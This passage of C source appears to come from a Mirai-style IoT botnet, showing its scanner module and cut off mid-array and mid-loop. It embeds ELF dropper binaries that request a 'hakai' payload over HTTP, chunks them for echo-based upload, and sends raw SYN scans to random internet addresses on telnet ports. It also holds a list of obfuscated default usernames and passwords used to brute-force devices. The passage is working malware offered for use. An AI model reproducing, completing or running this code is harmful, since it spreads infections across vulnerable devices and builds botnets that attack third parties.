00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x0b\x00\x00\x00\x01\x00\x00\x00\x06\x80\x00\x00\x94\x00\x00\x00\x94\x00\x00\x02\x60\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x04\x00\x00\x00\x00\x00\x00\x00\x11\x00\x00\x00\x01\x00\x00\x00\x32\x80\x00\x02\xf4\x00\x00\x02\xf4\x00\x00\x00\x23\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x19\x00\x00\x00\x08\x00\x00\x00\x03\x80\x00\x23\x18\x00\x00\x03\x18\x00\x00\x00\x08\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x04\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x03\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x03\x18\x00\x00\x00\x1e\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00", 1024,
    // sparc
    BIT_32, ENDIAN_BIG, EM_SPARC, "\x7f\x45\x4c\x46\x01\x02\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x02\x00\x02\x00\x00\x00\x01\x00\x01\x01\x80\x00\x00\x00\x34\x00\x00\x03\x38\x00\x00\x00\x00\x00\x34\x00\x20\x00\x03\x00\x28\x00\x05\x00\x04\x00\x00\x00\x01\x00\x00\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x00\x03\x18\x00\x00\x03\x18\x00\x00\x00\x05\x00\x01\x00\x00\x00\x00\x00\x01\x00\x00\x03\x18\x00\x02\x03\x18\x00\x02\x03\x18\x00\x00\x00\x00\x00\x00\x00\x08\x00\x00\x00\x06\x00\x01\x00\x00\x64\x74\xe5\x51\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x06\x00\x00\x00\x04\x92\x10\x00\x08\x90\x10\x20\x01\x82\x13\xc0\x00\x10\x80\x00\x7f\x01\x00\x00\x00\x01\x00\x00\x00\x92\x10\x00\x08\x90\x10\x20\x06\x82\x13\xc0\x00\x10\x80\x00\x79\x01\x00\x00\x00\x01\x00\x00\x00\x82\x10\x00\x09\x96\x10\x00\x0a\x92\x10\x00\x08\x94\x10\x00\x01\x90\x10\x20\x05\x82\x13\xc0\x00\x10\x80\x00\x70\x01\x00\x00\x00\x01\x00\x00\x00\x9d\xe3\xbf\x88\x92\x10\x20\x03\xf0\x27\xbf\xec\xf2\x27\xbf\xf0\xf4\x27\xbf\xf4\x94\x07\xbf\xec\x40\x00\x00\x67\x90\x10\x20\xce\x81\xc7\xe0\x08\x91\xe8\x00\x08\x82\x10\x00\x09\x96\x10\x00\x0a\x92\x10\x00\x08\x94\x10\x00\x01\x90\x10\x20\x04\x82\x13\xc0\x00\x10\x80\x00\x5d\x01\x00\x00\x00\x01\x00\x00\x00\x82\x10\x00\x09\x96\x10\x00\x0a\x92\x10\x00\x08\x94\x10\x00\x01\x90\x10\x20\x03\x82\x13\xc0\x00\x10\x80\x00\x54\x01\x00\x00\x00\x01\x00\x00\x00\x9d\xe3\xbf\x88\x92\x10\x20\x01\xf0\x27\xbf\xec\xf2\x27\xbf\xf0\xf4\x27\xbf\xf4\x94\x07\xbf\xec\x40\x00\x00\x4b\x90\x10\x20\xce\x81\xc7\xe0\x08\x91\xe8\x00\x08\x9d\xe3\xbf\x00\x82\x10\x20\x02\xc2\x37\xbf\xe4\x82\x10\x20\x50\x92\x10\x26\x01\x94\x10\x21\xff\xc2\x37\xbf\xe6\x03\x2c\xa0\x2e\x82\x10\x61\xfa\x11\x00\x00\x40\xc2\x27\xbf\xe8\x7f\xff\xff\xc6\x90\x12\x22\xf0\x92\x10\x20\x01\x94\x10\x20\x00\xa4\x10\x00\x08\x7f\xff\xff\xe6\x90\x10\x20\x02\x92\x07\xbf\xe4\xa2\x10\x00\x08\x7f\xff\xff\xc6\x94\x10\x20\x10\x90\x10\x00\x11\x13\x00\x00\x40\x94\x10\x20\x1b\x7f\xff\xff\xcb\x92\x12\x62\xf8\x80\xa2\x20\x1b\x02\x80\x00\x05\xa0\x10\x20\x00\x7f\xff\xff\xa7\x90\x10\x20\x03\xa0\x10\x20\x00\x92\x07\xbf\xf7\x94\x10\x20\x01\x7f\xff\xff\xca\x90\x10\x00\x11\x80\xa2\x20\x01\x02\x80\x00\x05\xc2\x4f\xbf\xf7\x7f\xff\xff\x9d\x90\x10\x20\x04\xc2\x4f\xbf\xf7\x85\x2c\x20\x08\xa0\x10\x80\x01\x03\x03\x42\x83\x82\x10\x61\x0a\x80\xa4\x00\x01\x12\xbf\xff\xf2\x92\x07\xbf\xf7\xa0\x07\xbf\x64\x90\x10\x00\x11\x92\x10\x00\x10\x7f\xff\xff\xb8\x94\x10\x20\x80\x80\xa2\x20\x00\x04\x80\x00\x07\x94\x10\x00\x08\x92\x10\x00\x10\x7f\xff\xff\xa9\x90\x10\x00\x12\x10\xbf\xff\xf6\xa0\x07\xbf\x64\x7f\xff\xff\x8c\x90\x10\x00\x11\x7f\xff\xff\x8a\x90\x10\x00\x12\x7f\xff\xff\x82\x90\x10\x20\x03\x81\xc7\xe0\x08\x81\xe8\x00\x00\x82\x10\x00\x08\x90\x10\x00\x09\x92\x10\x00\x0a\x94\x10\x00\x0b\x96\x10\x00\x0c\x98\x10\x00\x0d\x91\xd0\x20\x10\x0a\x80\x00\x04\x01\x00\x00\x00\x81\xc3\xe0\x08\x01\x00\x00\x00\x9d\xe3\xbf\x98\x40\x00\x00\x05\x01\x00\x00\x00\xf0\x22\x00\x00\x81\xc7\xe0\x08\x91\xe8\x3f\xff\x11\x00\x00\x80\x81\xc3\xe0\x08\x90\x12\x23\x18\x00\x00\x00\x00\x68\x61\x6b\x61\x69\x00\x00\x00\x47\x45\x54\x20\x2f\x68\x61\x6b\x61\x69\x2e\x73\x70\x63\x20\x48\x54\x54\x50\x2f\x31\x2e\x30\x0d\x0a\x0d\x0a\x00\x00\x00\x00\x00\x00\x2e\x73\x68\x73\x74\x72\x74\x61\x62\x00\x2e\x74\x65\x78\x74\x00\x2e\x72\x6f\x64\x61\x74\x61\x00\x2e\x62\x73\x73\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x0b\x00\x00\x00\x01\x00\x00\x00\x06\x00\x01\x00\x94\x00\x00\x00\x94\x00\x00\x02\x58\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x04\x00\x00\x00\x00\x00\x00\x00\x11\x00\x00\x00\x01\x00\x00\x00\x32\x00\x01\x02\xf0\x00\x00\x02\xf0\x00\x00\x00\x28\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x08\x00\x00\x00\x01\x00\x00\x00\x19\x00\x00\x00\x08\x00\x00\x00\x03\x00\x02\x03\x18\x00\x00\x03\x18\x00\x00\x00\x08\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x04\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x03\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x03\x18\x00\x00\x00\x1e\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00", 1024,
    // superh
    BIT_32, ENDIAN_LITTLE, EM_SH, "\x7f\x45\x4c\x46\x01\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x02\x00\x2a\x00\x01\x00\x00\x00\x68\x01\x40\x00\x34\x00\x00\x00\xfc\x02\x00\x00\x02\x00\x00\x00\x34\x00\x20\x00\x03\x00\x28\x00\x05\x00\x04\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x40\x00\x00\x00\x40\x00\xdc\x02\x00\x00\xdc\x02\x00\x00\x05\x00\x00\x00\x00\x00\x01\x00\x01\x00\x00\x00\xdc\x02\x00\x00\xdc\x02\x41\x00\xdc\x02\x41\x00\x00\x00\x00\x00\x08\x00\x00\x00\x06\x00\x00\x00\x00\x00\x01\x00\x51\xe5\x74\x64\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x06\x00\x00\x00\x04\x00\x00\x00\x04\xd1\x43\x65\xe6\x2f\x01\xe4\xf3\x6e\xe3\x6f\xf6\x6e\x2b\x41\x09\x00\x09\x00\x68\x02\x40\x00\x04\xd1\x43\x65\xe6\x2f\x06\xe4\xf3\x6e\xe3\x6f\xf6\x6e\x2b\x41\x09\x00\x09\x00\x68\x02\x40\x00\x53\x61\x63\x67\x13\x66\x04\xd1\xe6\x2f\x43\x65\xf3\x6e\x05\xe4\xe3\x6f\xf6\x6e\x2b\x41\x09\x00\x68\x02\x40\x00\xe6\x2f\x22\x4f\x07\xd0\xf4\x7f\xf3\x6e\x42\x2e\x51\x1e\x66\xe4\x62\x1e\x03\xe5\x0b\x40\xe3\x66\x0c\x7e\xe3\x6f\x26\x4f\xf6\x6e\x0b\x00\x09\x00\x68\x02\x40\x00\x53\x61\x63\x67\x13\x66\x04\xd1\xe6\x2f\x43\x65\xf3\x6e\x04\xe4\xe3\x6f\xf6\x6e\x2b\x41\x09\x00\x68\x02\x40\x00\x53\x61\x63\x67\x13\x66\x04\xd1\xe6\x2f\x43\x65\xf3\x6e\x03\xe4\xe3\x6f\xf6\x6e\x2b\x41\x09\x00\x68\x02\x40\x00\xe6\x2f\x22\x4f\x07\xd0\xf4\x7f\xf3\x6e\x42\x2e\x51\x1e\x66\xe4\x62\x1e\x01\xe5\x0b\x40\xe3\x66\x0c\x7e\xe3\x6f\x26\x4f\xf6\x6e\x0b\x00\x09\x00\x68\x02\x40\x00\x86\x2f\x02\xe1\x96\x2f\xa6\x2f\xb6\x2f\xe6\x2f\x22\x4f\x5b\x92\xb4\x7f\x5a\x90\xb8\x7f\x59\x98\xf3\x6e\x25\x0e\xec\x38\x2d\xd0\x11\x28\x2d\xd1\x2d\xd4\x11\x18\x51\x95\x51\x96\x0b\x40\x09\x00\x03\x6b\x2b\xd0\x02\xe4\x01\xe5\x0b\x40\x00\xe6\x03\x64\x03\x69\x28\xd0\x83\x65\x0b\x40\x10\xe6\x27\xd0\x93\x64\x27\xd5\x0b\x40\x1b\xe6\x1b\x88\x02\x89\x26\xd1\x0b\x41\x03\xe4\x00\xe8\x38\x9a\x93\x64\x24\xd0\x01\xe6\xec\x3a\xa3\x65\x0b\x40\x18\x48\x01\x88\x03\x8d\x04\xe4\x1e\xd1\x0b\x41\x09\x00\xa0\x61\x1b\x28\x1e\xd1\x10\x38\xec\x8b\x1b\xd0\x93\x64\x20\x96\x0b\x40\xe3\x65\x15\x40\xe3\x65\x03\x66\x05\x8f\xb3\x64\x13\xd0\x0b\x40\x09\x00\xf1\xaf\x09\x00\x16\xd8\x0b\x48\x93\x64\x0b\x48\xb3\x64\x10\xd1\x0b\x41\x03\xe4\x48\x7e\x4c\x7e\xe3\x6f\x26\x4f\xf6\x6e\xf6\x6b\xf6\x6a\xf6\x69\xf6\x68\x0b\x00\x09\x00\x00\x50\x82\x00\x80\x00\x41\x02\xff\x01\x93\x00\xc4\x00\x40\x00\xb2\x80\xb9\xfa\xb8\x02\x40\x00\x40\x01\x40\x00\xe0\x00\x40\x00\x08\x01\x40\x00\xc0\x02\x40\x00\x94\x00\x40\x00\x24\x01\x40\x00\x0a\x0d\x0a\x0d\xac\x00\x40\x00\x86\x2f\x43\x63\xe6\x2f\x53\x64\x22\x4f\x63\x65\xf3\x6e\x73\x66\xe4\x50\xe3\x57\xe5\x51\x16\xc3\x82\xe1\x16\x30\x06\x8f\x03\x68\x05\xd0\x0b\x40\x09\x00\x8b\x61\x12\x20\xff\xe0\xe3\x6f\x26\x4f\xf6\x6e\xf6\x68\x0b\x00\x09\x00\xa4\x02\x40\x00\x03\xd0\xe6\x2f\xf3\x6e\xe3\x6f\xf6\x6e\x0b\x00\x09\x00\x09\x00\xdc\x02\x41\x00\x68\x61\x6b\x61\x69\x00\x00\x00\x47\x45\x54\x20\x2f\x68\x61\x6b\x61\x69\x2e\x73\x68\x34\x20\x48\x54\x54\x50\x2f\x31\x2e\x30\x0d\x0a\x0d\x0a\x00\x00\x2e\x73\x68\x73\x74\x72\x74\x61\x62\x00\x2e\x74\x65\x78\x74\x00\x2e\x72\x6f\x64\x61\x74\x61\x00\x2e\x62\x73\x73\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x0b\x00\x00\x00\x01\x00\x00\x00\x06\x00\x00\x00\x94\x00\x40\x00\x94\x00\x00\x00\x24\x02\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x04\x00\x00\x00\x00\x00\x00\x00\x11\x00\x00\x00\x01\x00\x00\x00\x32\x00\x00\x00\xb8\x02\x40\x00\xb8\x02\x00\x00\x24\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x04\x00\x00\x00\x01\x00\x00\x00\x19\x00\x00\x00\x08\x00\x00\x00\x03\x00\x00\x00\xdc\x02\x41\x00\xdc\x02\x00\x00\x08\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x04\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x03\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xdc\x02\x00\x00\x1e\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00", 964,

    BIT_32, ENDIAN_LITTLE, EM_ARC, "\x7f\x45\x4c\x7f\x45\x4c", 12
};

static struct payload *get_retrieve_binary(struct scanner_connection *conn)
{
    int i = 0;
    struct payload *ptr = &payloads[i];


    while(ptr)
    {
        if(i == NUM_OF_PAYLOADS)
            break;
        //debug
        sockprintf(mainCommSock, "[scanner] attempting to compare bit endian, machine with payload %d:%d:%d, %d:%d:%d\n", conn->bit, conn->endianness, conn->machine, ptr->bit, ptr->endian, ptr->machine);
        if(conn->bit == ptr->bit && conn->endianness == ptr->endian && conn->machine == ptr->machine)
            return ptr;
        ptr++;
        i++;
    }

    return NULL;
}

static struct binary *process_retrieve_binary(struct scanner_connection *conn, struct payload *p)
{
    int i = 0;
    int pos = 0;
    struct binary *bin;
    char buf[5];
    int idx = 0;
    char buf2[MAX_ECHO_BYTES * 4];

    memset(buf2, 0, MAX_ECHO_BYTES * 4);
    bin = (struct binary *)calloc(p->len / MAX_ECHO_BYTES, sizeof(struct binary));

    for(i = 0; i < p->len / MAX_ECHO_BYTES; i++)
        bin[i].str = (char *)malloc(MAX_ECHO_BYTES * 4);

    retry:
    for(i = 0; i < p->len; i++)
    {
        if(i == MAX_ECHO_BYTES)
            break;
        memset(buf, 0, 5);
        sprintf(buf, "\\x%02x", (uint8_t)p->str[pos + i]);

        strcat(buf2, buf);
    }

    if(idx == p->len / MAX_ECHO_BYTES)
        return bin;


    memcpy(bin[idx].str, buf2, strlen(buf2));
    memset(buf2, 0, MAX_ECHO_BYTES * 4);
    bin->index = (uint8_t) idx;
    idx++;
    pos += i;
    goto retry;
}

void scanner_init(void) {
    int i;
    uint16_t source_port;
    struct iphdr *iph;
    struct tcphdr *tcph;

    // Let parent continue on main thread
    scanner_pid = fork();
    if (scanner_pid > 0 || scanner_pid == -1)
        return;

    LOCAL_ADDR = util_local_addr();

    rand_init();
    struct payload *p;
    struct binary *bin;
    fake_time = (uint32_t) time(NULL);
    conn_table = calloc(SCANNER_MAX_CONNS, sizeof (struct scanner_connection));
    for (i = 0; i < SCANNER_MAX_CONNS; i++) {
        conn_table[i].dropper_index = 0;
        conn_table[i].bit = 0;
        conn_table[i].endianness = 0;
        conn_table[i].machine = 0;
        conn_table[i].state = SC_CLOSED;
        conn_table[i].fd = -1;
    }

    // Set up raw socket scanning and payload
    if ((rsck = socket(AF_INET, SOCK_RAW, IPPROTO_TCP)) == -1) {
        sockprintf(mainCommSock, "[scanner] Failed to initialize raw socket, cannot scan\n");
        exit(0);
    }
    fcntl(rsck, F_SETFL, O_NONBLOCK | fcntl(rsck, F_GETFL, 0));
    i = 1;
    if (setsockopt(rsck, IPPROTO_IP, IP_HDRINCL, &i, sizeof (i)) != 0) {
        sockprintf(mainCommSock, "[scanner] Failed to set IP_HDRINCL, cannot scan\n");
        close(rsck);
        exit(0);
    }

    do {
        source_port = (uint16_t) (rand_next() & 0xffff);
    }
    while (ntohs(source_port) < 1024);

    iph = (struct iphdr *)scanner_rawpkt;
    tcph = (struct tcphdr *)(iph + 1);

    // Set up IPv4 header
    iph->ihl = 5;
    iph->version = 4;
    iph->tot_len = htons(sizeof (struct iphdr) + sizeof (struct tcphdr));
    iph->id = (uint16_t) rand_next();
    iph->ttl = 64;
    iph->protocol = IPPROTO_TCP;

    // Set up TCP header
    tcph->dest = htons(23);
    tcph->source = source_port;
    tcph->doff = 5;
    tcph->window = (uint16_t) (rand_next() & 0xffff);
    tcph->syn = TRUE;

    // Set up passwords
    add_auth_entry("\x50\x4D\x4D\x56", "\x5A\x41\x11\x17\x13\x13", 10);                     // root     xc3511
    add_auth_entry("\x50\x4D\x4D\x56", "\x54\x4B\x58\x5A\x54", 9);                          // root     vizxv
    add_auth_entry("\x50\x4D\x4D\x56", "\x43\x46\x4F\x4B\x4C", 10);                          // root     admin
    add_auth_entry("\x43\x46\x4F\x4B\x4C", "\x43\x46\x4F\x4B\x4C", 10);                      // admin    admin
    add_auth_entry("\x50\x4D\x4D\x56", "\x1A\x1A\x1A\x1A\x1A\x1A", 10);                      // root     888888
    add_auth_entry("\x50\x4D\x4D\x56", "\x5A\x4F\x4A\x46\x4B\x52\x41", 11);                  // root     xmhdipc
    add_auth_entry("\x50\x4D\x4D\x56", "\x46\x47\x44\x43\x57\x4E\x56", 11);                  // root     default
    add_auth_entry("\x50\x4D\x4D\x56", "\x48\x57\x43\x4C\x56\x47\x41\x4A", 12);              // root     juantech
    add_auth_entry("\x50\x4D\x4D\x56", "\x13\x10\x11\x16\x17\x14", 10);                      // root     123456
    add_auth_entry("\x50\x4D\x4D\x56", "\x17\x16\x11\x10\x13", 9);                          // root     54321
    add_auth_entry("\x51\x57\x52\x52\x4D\x50\x56", "\x51\x57\x52\x52\x4D\x50\x56", 14);      // support  support
    add_auth_entry("\x50\x4D\x4D\x56", "", 4);                                              // root     (none)
    add_auth_entry("\x43\x46\x4F\x4B\x4C", "\x52\x43\x51\x51\x55\x4D\x50\x46", 13);          // admin    password
    add_auth_entry("\x50\x4D\x4D\x56", "\x50\x4D\x4D\x56", 8);                              // root     root
    add_auth_entry("\x50\x4D\x4D\x56", "\x13\x10\x11\x16\x17", 9);                          // root     12345
    add_auth_entry("\x57\x51\x47\x50", "\x57\x51\x47\x50", 8);                              // user     user
    add_auth_entry("\x43\x46\x4F\x4B\x4C", "", 5);                                          // admin    (none)
    add_auth_entry("\x50\x4D\x4D\x56", "\x52\x43\x51\x51", 8);                              // root     pass
    add_auth_entry("\x43\x46\x4F\x4B\x4C", "\x43\x46\x4F\x4B\x4C\x13\x10\x11\x16", 14);      // admin    admin1234
    add_auth_entry("\x50\x4D\x4D\x56", "\x13\x13\x13\x13", 8);                              // root     1111
    add_auth_entry("\x43\x46\x4F\x4B\x4C", "\x51\x4F\x41\x43\x46\x4F\x4B\x4C", 13);          // admin    smcadmin
    add_auth_entry("\x43\x46\x4F\x4B\x4C", "\x13\x13\x13\x13", 9);                          // admin    1111
    add_auth_entry("\x50\x4D\x4D\x56", "\x14\x14\x14\x14\x14\x14", 10);                      // root     666666
    add_auth_entry("\x50\x4D\x4D\x56", "\x52\x43\x51\x51\x55\x4D\x50\x46", 12);              // root     password
    add_auth_entry("\x50\x4D\x4D\x56", "\x13\x10\x11\x16", 8);                              // root     1234
    add_auth_entry("\x50\x4D\x4D\x56", "\x49\x4E\x54\x13\x10\x11", 10);                      // root     klv123
    add_auth_entry("\x63\x46\x4F\x4B\x4C\x4B\x51\x56\x50\x43\x56\x4D\x50", "\x4F\x47\x4B\x4C\x51\x4F", 18); // Administrator admin
    add_auth_entry("\x51\x47\x50\x54\x4B\x41\x47", "\x51\x47\x50\x54\x4B\x41\x47", 14);      // service  service
    add_auth_entry("\x51\x57\x52\x47\x50\x54\x4B\x51\x4D\x50", "\x51\x57\x52\x47\x50\x54\x4B\x51\x4D\x50", 20); // supervisor supervisor
    add_auth_entry("\x45\x57\x47\x51\x56", "\x45\x57\x47\x51\x56", 10);                      // guest    guest
    add_auth_entry("\x45\x57\x47\x51\x56", "\x13\x10\x11\x16\x17", 10);                      // guest    12345
    add_auth_entry("\x45\x57\x47\x51\x56", "\x13\x10\x11\x16\x17", 10);                      // guest    12345
    add_auth_entry("\x43\x46\x4F\x4B\x4C\x13", "\x52\x43\x51\x51\x55\x4D\x50\x46", 14);      // admin1   password
    add_auth_entry("\x43\x46\x4F\x4B\x4C\x4B\x51\x56\x50\x43\x56\x4D\x50", "\x13\x10\x11\x16", 17); // administrator 1234
    add_auth_entry("\x14\x14\x14\x14\x14\x14", "\x14\x14\x14\x14\x14\x14", 12);              // 666666   666666
    add_auth_entry("\x1A\x1A\x1A\x1A\x1A\x1A", "\x1A\x1A\x1A\x1A\x1A\x1A", 12);              // 888888   888888
    add_auth_entry("\x57\x40\x4C\x56", "\x57\x40\x4C\x56", 8);                              // ubnt     ubnt
    add_auth_entry("\x50\x4D\x4D\x56", "\x49\x4E\x54\x13\x10\x11\x16", 11);                  // root     klv1234
    add_auth_entry("\x50\x4D\x4D\x56", "\x78\x56\x47\x17\x10\x13", 10);                      // root     Zte521
    add_auth_entry("\x50\x4D\x4D\x56", "\x4A\x4B\x11\x17\x13\x1A", 10);                      // root     hi3518
    add_auth_entry("\x50\x4D\x4D\x56", "\x48\x54\x40\x58\x46", 9);                          // root     jvbzd
    add_auth_entry("\x50\x4D\x4D\x56", "\x43\x4C\x49\x4D", 8);                              // root     anko
    add_auth_entry("\x50\x4D\x4D\x56", "\x58\x4E\x5A\x5A\x0C", 9);                          // root     zlxx.
    add_auth_entry("\x50\x4D\x4D\x56", "\x15\x57\x48\x6F\x49\x4D\x12\x54\x4B\x58\x5A\x54", 16); // root     7ujMko0vizxv
    add_auth_entry("\x50\x4D\x4D\x56", "\x15\x57\x48\x6F\x49\x4D\x12\x43\x46\x4F\x4B\x4C", 16); // root     7ujMko0admin
    add_auth_entry("\x50\x4D\x4D\x56", "\x51\x5B\x51\x56\x47\x4F", 10);                      // root     system
    add_auth_entry("\x50\x4D\x4D\x56", "\x4B\x49\x55\x40", 8);                              // root     ikwb
    add_auth_entry("\x50\x4D\x4D\x56", "\x46\x50\x47\x43\x4F\x40\x4D\x5A", 12);              // root     dreambox
    add_auth_entry("\x50\x4D\x4D\x56", "\x57\x51\x47\x50", 8);                              // root     user
    add_auth_entry("\x50\x4D\x4D\x56", "\x50\x47\x43\x4E\x56\x47\x49", 11);                  // root     realtek
    add_auth_entry("\x50\x4D\x4D\x56", "\x12\x12\x12\x12\x12\x12\x12\x12", 12);              // root     00000000
    add_auth_entry("\x43\x46\x4F\x4B\x4C", "\x13\x13\x13\x13\x13\x13\x13", 12);              // admin    1111111
    add_auth_entry("\x43\x46\x4F\x4B\x4C", "\x13\x10\x11\x16", 9);                          // admin    1234
    add_auth_entry("\x43\x46\x4F\x4B\x4C", "\x13\x10\x11\x16\x17", 10);                      // admin    12345
    add_auth_entry("\x43\x46\x4F\x4B\x4C", "\x17\x16\x11\x10\x13", 10);                      // admin    54321
    add_auth_entry("\x43\x46\x4F\x4B\x4C", "\x13\x10\x11\x16\x17\x14", 11);                  // admin    123456
    add_auth_entry("\x43\x46\x4F\x4B\x4C", "\x15\x57\x48\x6F\x49\x4D\x12\x43\x46\x4F\x4B\x4C", 17); // admin    7ujMko0admin
    add_auth_entry("\x43\x46\x4F\x4B\x4C", "\x16\x11\x10\x13", 9);                          // admin    1234
    add_auth_entry("\x43\x46\x4F\x4B\x4C", "\x52\x43\x51\x51", 9);                          // admin    pass
    add_auth_entry("\x43\x46\x4F\x4B\x4C", "\x4F\x47\x4B\x4C\x51\x4F", 11);                  // admin    meinsm
    add_auth_entry("\x56\x47\x41\x4A", "\x56\x47\x41\x4A", 8);                              // tech     tech
    add_auth_entry("\x4F\x4D\x56\x4A\x47\x50", "\x44\x57\x41\x49\x47\x50", 12);              // mother   fucker

    sockprintf(mainCommSock, "[scanner] Scanner process initialized. Scanning started.\n");

    // Main logic loop
    while (TRUE) {
        fd_set fdset_rd, fdset_wr;
        struct scanner_connection *conn;
        struct timeval tim;
        int last_avail_conn, last_spew = 0, mfd_rd = 0, mfd_wr = 0, nfds;

        // Spew out SYN to try and get a response
        if (fake_time != last_spew) {
            last_spew = fake_time;

            for (i = 0; i < SCANNER_RAW_PPS; i++) {
                struct sockaddr_in paddr = {0};
                struct iphdr *iph = (struct iphdr *)scanner_rawpkt;
                struct tcphdr *tcph = (struct tcphdr *)(iph + 1);

                iph->id = (uint16_t) rand_next();
                iph->saddr = LOCAL_ADDR;
                iph->daddr = get_random_ipv4();
                iph->check = 0;
                iph->check = checksum_generic((uint16_t *)iph, sizeof (struct iphdr));

                if (i % 10 == 0) {
                    tcph->dest = htons(2323);
                }
                else {
                    tcph->dest = htons(23);
                }
                tcph->seq = iph->daddr;
                tcph->check = 0;
                tcph->check = checksum_tcpudp(iph, tcph, htons(sizeof (struct tcphdr)), sizeof (struct tcphdr));

                paddr.sin_family = AF_INET;
                paddr.sin_addr.s_addr = iph->daddr;
                paddr.sin_port = tcph->dest;

                sendto(rsck, scanner_rawpkt, sizeof (scanner_rawpkt), MSG_NOSIGNAL, (struct sockaddr *)&paddr, sizeof (paddr));
            }
        }

        // Read packets from raw socket to get SYN+ACKs
        last_avail_conn = 0;
        while (TRUE) {
            int n;
            char dgram[1514];
            struct iphdr *iph = (struct iphdr *)dgram;
            struct tcphdr *tcph = (struct tcphdr *)(iph + 1);
            struct scanner_connection *conn;

            errno = 0;
            n = (int) recvfrom(rsck, dgram, sizeof (dgram), MSG_NOSIGNAL, NULL, NULL);
            if (n <= 0 || errno == EAGAIN || errno == EWOULDBLOCK)
                break;

            if (n < sizeof(struct iphdr) + sizeof(struct tcphdr))
                continue;
            if (iph->daddr != LOCAL_ADDR)
                continue;
            if (iph->protocol != IPPROTO_TCP)
                continue;
            if (tcph->source != htons(23) && tcph->source != htons(2323))
                continue;
            if (tcph->dest != source_port)
                continue;
            if (!tcph->syn)
                continue;
            if (!tcph->ack)
                continue;
            if (tcph->rst)
                continue;
            if (tcph->fin)
                continue;
            if (htonl(ntohl(tcph->ack_seq) - 1) != iph->saddr)
                continue;

            conn = NULL;
            for (n = last_avail_conn; n < SCANNER_MAX_CONNS; n++) {
                if (conn_table[n].state == SC_CLOSED) {
                    conn = &conn_table[n];
                    last_avail_conn = n;
                    break;
                }
            }

            // If there were no slots, then no point reading any more
            if (conn == NULL)
                break;

            conn->dst_addr = iph->saddr;
            conn->dst_port = tcph->source;
            setup_connection(conn);
            sockprintf(mainCommSock, "[scanner] FD%d Attempting to brute found IP %d.%d.%d.%d\n", conn->fd, iph->saddr & 0xff, (iph->saddr >> 8) & 0xff, (iph->saddr >> 16) & 0xff, (iph->saddr >> 24) & 0xff);
        }

        // Load file descriptors into fdsets
        FD_ZERO(&fdset_rd);
        FD_ZERO(&fdset_wr);
        for (i = 0; i < SCANNER_MAX_CONNS; i++) {
            int timeout;

            conn = &conn_table[i];
            timeout = (conn->state > SC_CONNECTING ? 30 : 5);

            if (conn->state != SC_CLOSED && (fake_time - conn->last_recv) > timeout) {
                sockprintf(mainCommSock, "[scanner] FD%d timed out (state = %d)\n", conn->fd, conn->state);
                close(conn->fd);
                conn->fd = -1;

                // Retry
                if (conn->state > SC_HANDLE_IACS) { // If we were at least able to connect, try again
                    if (++(conn->tries) == 10) {
                        conn->tries = 0;
                        conn->state = SC_CLOSED;
                    }
                    else {
                        setup_connection(conn);
                        sockprintf(mainCommSock, "[scanner] FD%d retrying with different auth combo!\n", conn->fd);
                    }
                }
                else {
                    conn->tries = 0;
                    conn->state = SC_CLOSED;
                }
                continue;
            }

            if (conn->state == SC_CONNECTING) {
                FD_SET(conn->fd, &fdset_wr);
                if (conn->fd > mfd_wr)
                    mfd_wr = conn->fd;
            }
            else if (conn->state != SC_CLOSED) {
                FD_SET(conn->fd, &fdset_rd);
                if (conn->fd > mfd_rd)
                    mfd_rd = conn->fd;
            }
        }

        tim.tv_usec = 0;
        tim.tv_sec = 1;
        nfds = select(1 + (mfd_wr > mfd_rd ? mfd_wr : mfd_rd), &fdset_rd, &fdset_wr, NULL, &tim);
        fake_time = (uint32_t)time(NULL);

        for (i = 0; i < SCANNER_MAX_CONNS; i++) {
            conn = &conn_table[i];

            if (conn->fd == -1)
                continue;

            if (FD_ISSET(conn->fd, &fdset_wr)) {
                int err = 0, ret = 0;
                socklen_t err_len = sizeof (err);

                ret = getsockopt(conn->fd, SOL_SOCKET, SO_ERROR, &err, &err_len);
                if (err == 0 && ret == 0) {
                    conn->state = SC_HANDLE_IACS;
                    conn->auth = random_auth_entry();
                    conn->rdbuf_pos = 0;
